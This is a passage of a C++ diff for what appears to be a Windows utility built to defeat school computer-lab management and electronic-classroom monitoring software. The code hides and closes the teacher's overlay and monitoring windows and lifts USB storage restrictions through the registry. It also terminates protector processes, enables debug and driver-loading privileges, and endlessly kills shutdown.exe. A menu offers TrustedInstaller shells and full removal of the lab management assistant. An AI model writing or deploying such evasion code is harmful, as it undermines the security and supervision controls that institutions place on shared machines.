+            (suspiciousClassDirect || suspiciousClassVariant || isExplorerClass || isButtonClass)) {
+            shouldRemove = true;
+        }
+        
+        // 条件14：检测所有无标题的小窗口（如果同时存在多个）
+        if (isSmallWindow && noTitle && isTopmost && isLayered) {
+            shouldRemove = true;
+        }
+        
+        // 条件15：Button类小窗口（可能是白色覆盖按钮）
+        if (isSmallWindow && isButtonClass && isTopmost) {
+            shouldRemove = true;
+        }
+        
+        // 条件16：所有无标题的小窗口（放宽条件，用于检测纯白色覆盖窗口）
+        if (isSmallWindow && noTitle && isTopmost) {
+            shouldRemove = true;
+        }
+        
+        // 条件17：无标题的小窗口 + 分层
+        if (isSmallWindow && noTitle && isLayered) {
+            shouldRemove = true;
+        }
+        
+        // 条件18：检测Explorer进程的所有无标题子窗口
+        if (isExplorerClass && isSmallWindow && noTitle && (isTopmost || isLayered)) {
+            shouldRemove = true;
+        }
+        
+        // 条件19：所有Explorer进程的小窗口（放宽条件）
+        if (isExplorerClass && isSmallWindow && noTitle) {
+            shouldRemove = true;
+        }
+        
+        // 条件20：所有无标题的小窗口（最宽松条件）
+        if (isSmallWindow && noTitle) {
+            shouldRemove = true;
+        }
+        
+        // 移除覆盖窗口
+        if (shouldRemove) {
+            // 最小化窗口而不是移除
+            ShowWindow(hwnd, SW_MINIMIZE);
+        }
+        
+        return TRUE;
+    }, 0);
+    
+    // 额外：枚举所有窗口包括子窗口
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        // 枚举子窗口
+        EnumChildWindows(hwnd, [](HWND childHwnd, LPARAM) -> BOOL {
+            if (!childHwnd || !IsWindow(childHwnd)) return TRUE;
+            
+            DWORD pid;
+            GetWindowThreadProcessId(childHwnd, &pid);
+            if (pid == GetCurrentProcessId()) return TRUE;
+            
+            wchar_t className[256] = {};
+            wchar_t windowTitle[256] = {};
+            
+            GetClassNameW(childHwnd, className, 256);
+            GetWindowTextW(childHwnd, windowTitle, 256);
+            
+            LONG exStyle = GetWindowLongW(childHwnd, GWL_EXSTYLE);
+            LONG style = GetWindowLongW(childHwnd, GWL_STYLE);
+            
+            RECT rect;
+            if (!GetWindowRect(childHwnd, &rect)) return TRUE;
+            
+            int winW = rect.right - rect.left;
+            int winH = rect.bottom - rect.top;
+            
+            // 检测小窗口
+            bool isSmallWindow = (winW >= 50 && winW <= 200 && winH >= 20 && winH <= 150);
+            bool noTitle = (windowTitle[0] == L'\0' || windowTitle[0] == L' ');
+            bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
+            bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
+            
+            // 检测Explorer相关类
+            bool isExplorerClass = wcsstr(className, L"CabinetWClass") != nullptr ||
+                                 wcsstr(className, L"ExploreWClass") != nullptr ||
+                                 wcsstr(className, L"ShellTabWindowClass") != nullptr ||
+                                 wcsstr(className, L"DirectUIHWND") != nullptr ||
+                                 wcsstr(className, L"DUIListView") != nullptr ||
+                                 wcsstr(className, L"SysTreeView32") != nullptr ||
+                                 wcsstr(className, L"SysListView32") != nullptr ||
+                                 wcsstr(className, L"Button") != nullptr ||
+                                 wcsstr(className, L"Static") != nullptr;
+            
+            // 检测条件
+            bool shouldRemove = false;
+            
+            // 所有Explorer子窗口（如果是小窗口+无标题）
+            if (isExplorerClass && isSmallWindow && noTitle) {
+                shouldRemove = true;
+            }
+            
+            // 无标题小窗口 + 置顶
+            if (isSmallWindow && noTitle && isTopmost) {
+                shouldRemove = true;
+            }
+            
+            // 无标题小窗口 + 分层
+            if (isSmallWindow && noTitle && isLayered) {
+                shouldRemove = true;
+            }
+            
+            // 移除覆盖窗口
+            if (shouldRemove) {
+                // 最小化窗口而不是移除
+                ShowWindow(childHwnd, SW_MINIMIZE);
+            }
+            
+            return TRUE;
+        }, 0);
+        
+        return TRUE;
+    }, 0);
+}
+
+// USB存储恢复功能实现
+bool ProcessTerminator::RestoreUSBStorage() {
+    DMSP_VERIFY_RET(0x2009, false);  // USB解禁子函数 - 二级验证
+    bool success = true;
+    
+    // 方法1: 启用USB存储设备
+    success &= EnableUSBDevice(L"");
+    
+    // 方法2: 清除USB注册表限制
+    success &= ClearUSBRegistryLimits();
+    
+    // 方法3: 尝试启动USBSTOR服务
+    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (hSCManager) {
+        SC_HANDLE hService = OpenServiceW(hSCManager, L"USBSTOR", SERVICE_START | SERVICE_QUERY_STATUS);
+        if (hService) {
+            SERVICE_STATUS status;
+            if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
+                StartServiceW(hService, 0, nullptr);
+            }
+            CloseServiceHandle(hService);
+        }
+        CloseServiceHandle(hSCManager);
+    }
+    
+    return success;
+}
+
+bool ProcessTerminator::EnableUSBDevice(const std::wstring& deviceInstanceId) {
+    GUID guid = GUID_DEVCLASS_USB;
+    HDEVINFO hDevInfo = SetupDiGetClassDevsW(&guid, nullptr, nullptr, DIGCF_PRESENT);
+    
+    if (hDevInfo == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    SP_DEVINFO_DATA devInfoData = {};
+    devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
+    
+    bool foundDevice = false;
+    
+    for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfoData); i++) {
+        wchar_t instanceId[MAX_DEVICE_ID_LEN] = {};
+        if (CM_Get_Device_IDW(devInfoData.DevInst, instanceId, MAX_DEVICE_ID_LEN, 0) != CR_SUCCESS) {
+            continue;
+        }
+        
+        // 检查是否为USB存储设备
+        wchar_t compatibleIds[256] = {};
+        DWORD buffersize = sizeof(compatibleIds);
+        if (SetupDiGetDeviceRegistryPropertyW(hDevInfo, &devInfoData,
+            SPDRP_COMPATIBLEIDS, nullptr, (PBYTE)compatibleIds, buffersize, nullptr)) {
+            
+            bool isStorage = wcsstr(compatibleIds, L"USBSTOR") != nullptr ||
+                            wcsstr(compatibleIds, L"USB\\Class_08") != nullptr ||
+                            wcsstr(compatibleIds, L"USB\\DevClass_08") != nullptr;
+            
+            if (isStorage) {
+                // 获取设备状态
+                DWORD status, problem;
+                if (CM_Get_DevNode_Status(&status, &problem, devInfoData.DevInst, 0) == CR_SUCCESS) {
+                    // 如果设备被禁用或有问题，尝试启用
+                    if (problem == CM_PROB_DISABLED ||
+                        (status & DN_DEVICE_DISABLED) ||
+                        (status & DN_WILL_BE_REMOVED)) {
+                        
+                        // 启用设备 - 直接传入DEVINST值而不是指针
+                        CONFIGRET cr = CM_Enable_DevNode(devInfoData.DevInst, 0);
+                        if (cr == CR_SUCCESS) {
+                            std::wcout << L"  [USB] 已启用设备: " << instanceId << std::endl;
+                            foundDevice = true;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    SetupDiDestroyDeviceInfoList(hDevInfo);
+    return foundDevice || true;
+}
+
+bool ProcessTerminator::ClearUSBRegistryLimits() {
+    const wchar_t* keys[] = {
+        L"SYSTEM\\CurrentControlSet\\Services\\USBSTOR",
+        L"SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies",
+        L"SYSTEM\\CurrentControlSet\\Control\\USB",
+        L"SYSTEM\\CurrentControlSet\\Enum\\USB"
+    };
+    
+    for (const wchar_t* keyPath : keys) {
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            // 尝试删除阻止USB的键值
+            const wchar_t* values[] = { L"WriteProtect", L"EnableUsageCounting", L"DisableOnEject" };
+            for (const wchar_t* valueName : values) {
+                RegDeleteValueW(hKey, valueName);
+            }
+            
+            // 如果Start值存在，设置为3（demand start）
+            DWORD startValue = 3;
+            RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&startValue, sizeof(startValue));
+            
+            RegCloseKey(hKey);
+        }
+    }
+    
+    return true;
+}
+
+bool ProcessTerminator::RestoreInputDevices() {
+    bool success = true;
+    
+    // 方法1: 解除输入阻塞
+    success &= UnblockInput();
+    
+    // 方法2: 卸载全局输入钩子
+    success &= UnhookGlobalInputHooks();
+    
+    // 方法3: 强制恢复前台窗口焦点
+    HWND targetWnd = g_targetTopmostWindow;
+    if (targetWnd && IsWindow(targetWnd)) {
+        ForceSetForegroundWindow(targetWnd);
+    }
+    
+    // 方法4: 查找并销毁可疑的焦点拦截窗口
+    std::vector<HWND> interceptWindows;
+    
+    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
+        if (!IsWindowVisible(hwnd)) return TRUE;
+        
+        wchar_t className[256] = {};
+        GetClassNameW(hwnd, className, 256);
+        
+        wchar_t windowTitle[256] = {};
+        GetWindowTextW(hwnd, windowTitle, 256);
+        
+        // 检测可疑类名（全局钩子类）
+        bool suspiciousClass = wcsstr(className, L"Hook") != nullptr ||
+                            wcsstr(className, L"Global") != nullptr ||
+                            wcsstr(className, L"Input") != nullptr ||
+                            wcsstr(className, L"Keyboard") != nullptr ||
+                            wcsstr(className, L"Mouse") != nullptr ||
+                            wcsstr(className, L"KeyboardHook") != nullptr ||
+                            wcsstr(className, L"MouseHook") != nullptr ||
+                            wcsstr(className, L"WH_KEYBOARD") != nullptr ||
+                            wcsstr(className, L"WH_MOUSE") != nullptr ||
+                            wcsstr(className, L"Monitor") != nullptr ||
+                            wcsstr(className, L"Control") != nullptr ||
+                            wcsstr(className, L"Education") != nullptr;
+        
+        // 检测可疑标题
+        bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
+                            wcsstr(windowTitle, L"监控") != nullptr ||
+                            wcsstr(windowTitle, L"控制") != nullptr ||
+                            wcsstr(windowTitle, L"锁定") != nullptr ||
+                            wcsstr(windowTitle, L"屏幕广播") != nullptr ||
+                            wcsstr(windowTitle, L"电子教室") != nullptr ||
+                            wcsstr(windowTitle, L"学生机") != nullptr ||
+                            wcsstr(windowTitle, L"教师端") != nullptr;
+        
+        // 检查窗口是否具有WS_EX_TOPMOST样式
+        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
+        
+        if ((suspiciousClass || suspiciousTitle) && isTopmost) {
+            std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
+            windows->push_back(hwnd);
+        }
+        
+        return TRUE;
+    }, reinterpret_cast<LPARAM>(&interceptWindows));
+    
+    // 销毁可疑的焦点拦截窗口
+    for (HWND hwnd : interceptWindows) {
+        DWORD pid;
+        GetWindowThreadProcessId(hwnd, &pid);
+        
+        if (pid != GetCurrentProcessId()) {
+            PostMessageW(hwnd, WM_CLOSE, 0, 0);
+            ShowWindow(hwnd, SW_HIDE);
+        }
+    }
+    
+    return success;
+}
+
+bool ProcessTerminator::UnblockInput() {
+    // 尝试解除输入阻塞
+    // 注意：BlockInput(FALSE)只有在被阻塞时返回true，
+    // 如果没有阻塞则返回false，这是正常行为，不需要输出消息
+    BlockInput(FALSE);
+    return true;
+}
+
+bool ProcessTerminator::UnhookGlobalInputHooks() {
+    // 查找可能的钩子窗口并尝试卸载
+    HWND shellTray = FindWindowW(L"Shell_TrayWnd", nullptr);
+    if (shellTray) {
+        DWORD pid;
+        GetWindowThreadProcessId(shellTray, &pid);
+    }
+    
+    // 枚举所有顶级窗口查找可疑钩子
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        wchar_t className[256] = {};
+        wchar_t windowTitle[256] = {};
+        
+        GetClassNameW(hwnd, className, 256);
+        GetWindowTextW(hwnd, windowTitle, 256);
+        
+        // 检测可疑类名或标题
+        bool suspicious = wcsstr(className, L"Hook") != nullptr ||
+                         wcsstr(className, L"Keyboard") != nullptr ||
+                         wcsstr(className, L"Mouse") != nullptr ||
+                         wcsstr(windowTitle, L"Monitor") != nullptr ||
+                         wcsstr(windowTitle, L"Control") != nullptr;
+        
+        if (suspicious && IsWindowVisible(hwnd)) {
+            // 尝试销毁可疑窗口
+            DWORD pid;
+            GetWindowThreadProcessId(hwnd, &pid);
+            
+            // 检查是否是其他进程的窗口
+            if (pid != GetCurrentProcessId()) {
+                // 尝试发送关闭消息
+                PostMessageW(hwnd, WM_CLOSE, 0, 0);
+            }
+        }
+        return TRUE;
+    }, 0);
+    
+    return true;
+}
+
+// 全屏覆盖检测与对抗功能实现
+bool ProcessTerminator::IsSuspiciousOverlayWindow(HWND hwnd) {
+    if (!hwnd || !IsWindow(hwnd)) return false;
+    if (!IsWindowVisible(hwnd)) return false;
+    
+    wchar_t className[256] = {};
+    wchar_t windowTitle[256] = {};
+    
+    GetClassNameW(hwnd, className, 256);
+    GetWindowTextW(hwnd, windowTitle, 256);
+    
+    LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+    
+    RECT rect;
+    if (!GetWindowRect(hwnd, &rect)) return false;
+    
+    int width = rect.right - rect.left;
+    int height = rect.bottom - rect.top;
+    int screenW = GetSystemMetrics(SM_CXSCREEN);
+    int screenH = GetSystemMetrics(SM_CYSCREEN);
+    
+    bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
+    bool isPopup = (style & WS_POPUP) != 0;
+    bool isFullscreen = (width >= screenW * 0.95f && height >= screenH * 0.95f);
+    bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
+    bool isToolWindow = (exStyle & WS_EX_TOOLWINDOW) != 0;
+    
+    bool suspiciousClass = wcsstr(className, L"DXGI") != nullptr ||
+                         wcsstr(className, L"D3D") != nullptr ||
+                         wcsstr(className, L"Overlay") != nullptr ||
+                         wcsstr(className, L"Hook") != nullptr ||
+                         wcsstr(className, L"Fullscreen") != nullptr ||
+                         wcsstr(className, L"Screen") != nullptr ||
+                         wcsstr(className, L"Monitor") != nullptr ||
+                         wcsstr(className, L"ClassRoom") != nullptr ||
+                         wcsstr(className, L"Education") != nullptr ||
+                         wcsstr(className, L"Control") != nullptr;
+    
+    bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
+                         wcsstr(windowTitle, L"监控") != nullptr ||
+                         wcsstr(windowTitle, L"控制") != nullptr ||
+                         wcsstr(windowTitle, L"屏幕") != nullptr ||
+                         wcsstr(windowTitle, L"屏幕广播") != nullptr ||
+                         wcsstr(windowTitle, L"学生机") != nullptr ||
+                         wcsstr(windowTitle, L"教师端") != nullptr ||
+                         wcsstr(windowTitle, L"电子教室") != nullptr;
+    
+    DWORD pid;
+    GetWindowThreadProcessId(hwnd, &pid);
+    bool isOwnProcess = (pid == GetCurrentProcessId());
+    
+    if (isOwnProcess) return false;
+    if (isToolWindow && !isFullscreen) return false;
+    
+    if ((isTopmost && isFullscreen) || (suspiciousClass && isFullscreen) || 
+        (isLayered && isFullscreen && suspiciousTitle) ||
+        (isPopup && isFullscreen && suspiciousTitle) ||
+        (isTopmost && isLayered && isFullscreen)) {
+        return true;
+    }
+    
+    return false;
+}
+
+bool ProcessTerminator::DetectDXGIOverlayWindows(std::vector<HWND>& overlayWindows) {
+    overlayWindows.clear();
+    
+    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
+        if (ProcessTerminator::IsSuspiciousOverlayWindow(hwnd)) {
+            std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
+            windows->push_back(hwnd);
+        }
+        return TRUE;
+    }, reinterpret_cast<LPARAM>(&overlayWindows));
+    
+    return !overlayWindows.empty();
+}
+
+bool ProcessTerminator::DetectGDILayeredOverlay(std::vector<HWND>& overlayWindows) {
+    overlayWindows.clear();
+    
+    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
+        if (!IsWindowVisible(hwnd)) return TRUE;
+        
+        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+        
+        if (!(exStyle & WS_EX_LAYERED)) return TRUE;
+        
+        RECT rect;
+        if (!GetWindowRect(hwnd, &rect)) return TRUE;
+        
+        int width = rect.right - rect.left;
+        int height = rect.bottom - rect.top;
+        int screenW = GetSystemMetrics(SM_CXSCREEN);
+        int screenH = GetSystemMetrics(SM_CYSCREEN);
+        
+        if (width >= screenW * 0.95f && height >= screenH * 0.95f) {
+            wchar_t windowTitle[256] = {};
+            GetWindowTextW(hwnd, windowTitle, 256);
+            
+            bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
+                                 wcsstr(windowTitle, L"监控") != nullptr ||
+                                 wcsstr(windowTitle, L"控制") != nullptr ||
+                                 wcsstr(windowTitle, L"广播") != nullptr ||
+                                 wcsstr(windowTitle, L"锁定") != nullptr ||
+                                 wcsstr(windowTitle, L"全屏") != nullptr;
+            
+            if (suspiciousTitle) {
+                std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
+                windows->push_back(hwnd);
+            }
+        }
+        
+        return TRUE;
+    }, reinterpret_cast<LPARAM>(&overlayWindows));
+    
+    return !overlayWindows.empty();
+}
+
+bool ProcessTerminator::RemoveFullscreenOverlay(HWND hwnd) {
+    if (!hwnd || !IsWindow(hwnd)) return false;
+    
+    DWORD pid;
+    GetWindowThreadProcessId(hwnd, &pid);
+    
+    if (pid == GetCurrentProcessId()) return false;
+    
+    PostMessageW(hwnd, WM_CLOSE, 0, 0);
+    
+    ShowWindow(hwnd, SW_HIDE);
+    
+    std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    
+    if (IsWindow(hwnd)) {
+        ShowWindow(hwnd, SW_MINIMIZE);
+    }
+    
+    return true;
+}
+
+bool ProcessTerminator::DetectAndRemoveFullscreenOverlays() {
+    std::vector<HWND> overlayWindows;
+    
+    DetectDXGIOverlayWindows(overlayWindows);
+    for (HWND hwnd : overlayWindows) {
+        if (IsSuspiciousOverlayWindow(hwnd)) {
+            RemoveFullscreenOverlay(hwnd);
+        }
+    }
+    
+    overlayWindows.clear();
+    DetectGDILayeredOverlay(overlayWindows);
+    for (HWND hwnd : overlayWindows) {
+        RemoveFullscreenOverlay(hwnd);
+    }
+    
+    return true;
+}
+
+// 获取指定进程的可执行文件所在目录
+std::wstring ProcessTerminator::GetProcessDirectory(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (!hProcess) {
+        return L"";
+    }
+    
+    wchar_t path[MAX_PATH] = { 0 };
+    DWORD size = MAX_PATH;
+    std::wstring directory;
+    
+    if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
+        std::wstring fullPath = path;
+        size_t lastSlash = fullPath.find_last_of(L"\\/");
+        if (lastSlash != std::wstring::npos) {
+            directory = fullPath.substr(0, lastSlash);
+        }
+    }
+    
+    CloseHandle(hProcess);
+    return directory;
+}
+
+// 获取当前进程的可执行文件所在目录
+std::wstring ProcessTerminator::GetCurrentProcessDirectory() {
+    wchar_t path[MAX_PATH] = { 0 };
+    if (GetModuleFileNameW(NULL, path, MAX_PATH) == 0) {
+        return L"";
+    }
+    
+    std::wstring fullPath = path;
+    size_t lastSlash = fullPath.find_last_of(L"\\/");
+    if (lastSlash != std::wstring::npos) {
+        return fullPath.substr(0, lastSlash);
+    }
+    return L"";
+}
+
+// 获取指定目录下的所有进程（不包括子目录）
+std::vector<std::pair<DWORD, std::wstring>> ProcessTerminator::GetProcessesInSameDirectory(const std::wstring& targetDir) {
+    std::vector<std::pair<DWORD, std::wstring>> processes;
+    
+    if (targetDir.empty()) return processes;
+    
+    // 标准化目标目录路径（转为小写用于比较）
+    std::wstring normalizedTargetDir = targetDir;
+    std::transform(normalizedTargetDir.begin(), normalizedTargetDir.end(), normalizedTargetDir.begin(), ::towlower);
+    
+    // 确保目录路径以反斜杠结尾，以便准确比较
+    if (!normalizedTargetDir.empty() && normalizedTargetDir.back() != L'\\') {
+        normalizedTargetDir += L'\\';
+    }
+    
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
+    
+    PROCESSENTRY32W pe32 = { 0 };
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    
+    if (Process32FirstW(hSnapshot, &pe32)) {
+        do {
+            // 跳过系统空闲进程和当前进程
+            if (pe32.th32ProcessID == 0 || pe32.th32ProcessID == GetCurrentProcessId()) continue;
+            
+            // 获取进程的可执行文件路径
+            HANDLE hProcess = OpenProcessEnhanced(pe32.th32ProcessID, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
+            if (!hProcess) continue;
+            
+            wchar_t path[MAX_PATH] = { 0 };
+            DWORD size = MAX_PATH;
+            std::wstring processDir;
+            
+            if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
+                std::wstring fullPath = path;
+                size_t lastSlash = fullPath.find_last_of(L"\\/");
+                if (lastSlash != std::wstring::npos) {
+                    processDir = fullPath.substr(0, lastSlash);
+                }
+            }
+            CloseHandle(hProcess);
+            
+            if (!processDir.empty()) {
+                std::transform(processDir.begin(), processDir.end(), processDir.begin(), ::towlower);
+                if (!processDir.empty() && processDir.back() != L'\\') {
+                    processDir += L'\\';
+                }
+                
+                if (processDir == normalizedTargetDir) {
+                    processes.push_back(std::make_pair(pe32.th32ProcessID, std::wstring(pe32.szExeFile)));
+                }
+            }
+        } while (Process32NextW(hSnapshot, &pe32));
+    }
+    
+    CloseHandle(hSnapshot);
+    return processes;
+}
+
+// 结束同目录下的保护进程
+bool ProcessTerminator::TerminateSameDirectoryProtectors(const std::wstring& targetProcessPath, bool useAllMethods) {
+    // 获取目标进程所在目录
+    size_t lastSlash = targetProcessPath.find_last_of(L"\\/");
+    if (lastSlash == std::wstring::npos) return true;
+    
+    std::wstring targetDir = targetProcessPath.substr(0, lastSlash);
+    std::wstring targetProcessName = targetProcessPath.substr(lastSlash + 1);
+    
+    // 获取同目录下的所有进程
+    std::vector<std::pair<DWORD, std::wstring>> sameDirProcesses = GetProcessesInSameDirectory(targetDir);
+    
+    if (sameDirProcesses.empty()) return true;
+    
+    std::wcout << L"检测到同目录下有 " << sameDirProcesses.size() << L" 个进程，正在分析保护进程..." << std::endl;
+    
+    bool allTerminated = true;
+    std::vector<std::wstring> processesToTerminate;
+    
+    for (const auto& proc : sameDirProcesses) {
+        const std::wstring& processName = proc.second;
+        
+        // 跳过目标进程自身
+        if (_wcsicmp(processName.c_str(), targetProcessName.c_str()) == 0) continue;
+        
+        // 检查是否在白名单中
+        if (IsSystemProcessWhitelisted(processName)) {
+            std::wstring processPath = targetDir + L"\\" + processName;
+            if (IsMicrosoftSigned(processPath)) continue;
+        }
+        
+        processesToTerminate.push_back(processName);
+    }
+    
+    if (processesToTerminate.empty()) {
+        std::wcout << L"没有需要终止的同目录保护进程" << std::endl;
+        return true;
+    }
+    
+    std::wcout << L"开始终止 " << processesToTerminate.size() << L" 个保护进程..." << std::endl;
+    
+    // 终止检测到的保护进程
+    int successCount = 0;
+    int failCount = 0;
+    for (const auto& procName : processesToTerminate) {
+        int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, procName.c_str(), -1, NULL, 0, NULL, NULL);
+        std::string narrowName;
+        if (sizeNeeded > 0) {
+            narrowName.resize(sizeNeeded - 1);
+            WideCharToMultiByte(CP_UTF8, 0, procName.c_str(), -1, &narrowName[0], sizeNeeded, NULL, NULL);
+        }
+        
+        bool result = false;
+        if (!result) result = terminateByProcessName(narrowName);
+        if (!result) result = terminateBySystemCommand(narrowName);
+        if (!result) result = terminateByParentChildRelationship(narrowName);
+        if (!result) result = terminateByProcessIsolationAndBlocking(narrowName);
+        if (!result) result = terminateByWindowHandle(narrowName);
+        
+        if (result) {
+            std::wcout << L"  [成功] 已终止保护进程: " << procName << std::endl;
+            successCount++;
+        } else {
+            std::wcout << L"  [失败] 无法终止保护进程: " << procName << std::endl;
+            allTerminated = false;
+            failCount++;
+        }
+    }
+    
+    return allTerminated;
+}
+void fgj() {
+    while (1) {
+        system("taskkill /f /im shutdown.exe >nul 2>&1");
+    }
+}
+// 显示主菜单
+void ShowMainMenu() {
+    std::wcout<<L"\n======================================================CMDPLUS======================================================" << std::endl;
+    std::wcout << std::endl;
+    std::wcout << std::endl;
+
+    std::wcout << L"===========================================Ver: 26.7.5_KERNEL_DRIVER_2=============================================" << std::endl;
+    std::wcout << std::endl;
+    std::wcout << std::endl;
+    std::wcout << L"                                           1. 结束进程" << std::endl;
+    std::wcout << L"                                           2. 打开TrustedInstaller权限的CMD并置顶" << std::endl;
+    std::wcout << L"                                           3. 开启强制置顶" << std::endl;
+    std::wcout << L"                                           4. 取消置顶" << std::endl;
+    std::wcout << L"                                           5. 以TrustedInstaller权限打开指定程序，防止最小化" << std::endl;
+    std::wcout << L"                                           6. 强力删除指定文件夹" << std::endl;
+    std::wcout << L"                                           7. USB解禁（恢复USB存储设备）" << std::endl;
+    std::wcout << L"                                           8. 完全删除学生机房管理助手" << std::endl;
+    std::wcout << L"                                           9. 安装信息管理" << std::endl;
+    std::wcout << L"                                          10. 垃圾清理" << std::endl;
+    std::wcout << L"                                          11. 反远程控制防火墙" << std::endl;
+    std::wcout << L"                                          12. 端口监控（永久检测）" << std::endl;
+    std::wcout << L"                                          13. 禁止指定端口连接" << std::endl;
+    std::wcout << L"                                          14. 肃清系统" << std::endl;
+    std::wcout << L"                                           0. 退出程序" << std::endl;
+    std::wcout << std::endl;
+    std::wcout << std::endl;
+    std::wcout << L"===================================================================================================================" << std::endl;
+}
+class DebugPrivilegeEnabler {
+public:
+    static bool EnableAllDebugPrivileges() {
+        HANDLE hToken = nullptr;
+
+        // 获取当前进程令牌
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+            std::cerr << "打开句柄错误：" << GetLastError() << std::endl;
+            return false;
+        }
+
+        // 定义需要启用的权限列表
+        std::vector<std::wstring> privileges = {
+            L"SeDebugPrivilege",           // 调试权限
+            L"SeSecurityPrivilege",        // 安全管理权限
+            L"SeBackupPrivilege",          // 备份权限
+            L"SeRestorePrivilege",         // 恢复权限
+            L"SeSystemEnvironmentPrivilege", // 系统环境权限
+            L"SeTakeOwnershipPrivilege",   // 取得所有权权限
+            L"SeLoadDriverPrivilege"       // 加载驱动权限
+        };
+
+        bool allSuccess = true;
+
+        for (const auto& privilege : privileges) {
+            if (!EnableSinglePrivilege(hToken, privilege.c_str())) {
+                std::wcerr << L"提升权限失败：" << privilege << std::endl;
+                allSuccess = false;
+            }
+        }
+
+        CloseHandle(hToken);
+        return allSuccess;
+    }
+
+private:
+    static bool EnableSinglePrivilege(HANDLE hToken, LPCWSTR privilegeName) {
+        LUID luid;
+
+        // 查找权限的LUID
+        if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid)) {
+            std::wcerr << L"错误" << privilegeName << GetLastError() << std::endl;
+            return false;
+        }
+
+        // 设置令牌权限
+        TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        // 调整令牌权限
+        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
+            nullptr, nullptr)) {
+            return false;
+        }
+
+        // 检查AdjustTokenPrivileges的最终错误状态
+        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+            return false;
+        }
+
+        return true;
+    }
+};
+
+// 智能识别Edge浏览器路径
+bool FindEdgePath(wchar_t* path, size_t pathSize) {
+    // 尝试多个可能的Edge路径
+    const wchar_t* edgePaths[] = {
+        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+    };
+    
+    for (const wchar_t* edgePath : edgePaths) {
+        if (wcsncmp(edgePath, L"%LOCALAPPDATA%", 15) == 0) {
+            wchar_t expandedPath[MAX_PATH];
+            ExpandEnvironmentStringsW(edgePath, expandedPath, MAX_PATH);
+            if (GetFileAttributesW(expandedPath) != INVALID_FILE_ATTRIBUTES) {
+                wcscpy_s(path, pathSize, expandedPath);
+                return true;
+            }
+        } else {
+            if (GetFileAttributesW(edgePath) != INVALID_FILE_ATTRIBUTES) {
+                wcscpy_s(path, pathSize, edgePath);
+                return true;
+            }
+        }
+    }
+    
+    // 尝试从注册表获取
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t value[MAX_PATH];
+        DWORD valueSize = sizeof(value);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)value, &valueSize) == ERROR_SUCCESS) {
+            if (GetFileAttributesW(value) != INVALID_FILE_ATTRIBUTES) {
+                wcscpy_s(path, pathSize, value);
+                RegCloseKey(hKey);
+                return true;
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    
+    return false;
+}
+
+// 智能识别Chrome浏览器路径
+bool FindChromePath(wchar_t* path, size_t pathSize) {
+    const wchar_t* chromePaths[] = {
+        L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
+        L"%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe"
+    };
+    
+    for (const wchar_t* chromePath : chromePaths) {
+        if (wcsncmp(chromePath, L"%LOCALAPPDATA%", 15) == 0) {
+            wchar_t expandedPath[MAX_PATH];
+            ExpandEnvironmentStringsW(chromePath, expandedPath, MAX_PATH);
+            if (GetFileAttributesW(expandedPath) != INVALID_FILE_ATTRIBUTES) {
+                wcscpy_s(path, pathSize, expandedPath);
